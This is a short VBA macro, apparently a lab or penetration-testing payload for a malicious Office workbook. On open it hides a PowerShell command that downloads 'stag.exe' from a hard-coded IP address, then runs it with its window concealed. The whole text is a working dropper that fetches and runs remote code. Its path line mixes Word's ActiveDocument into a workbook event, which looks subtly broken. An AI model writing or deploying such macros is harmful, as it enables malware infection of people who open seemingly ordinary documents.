Private Sub Workbook_Open()
    Dim exePath As String
    exePath = ActiveDocument + "\stag.exe"
    Dim str As String
    str = "powershell (New-Object System.netWebClient).DownloadFile('http://192.168.49.71/stag.exe', 'stag.exe')"
    Shell str, vbHide
    Wait (2)
    Shell exePath, vbHide
End Sub


Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
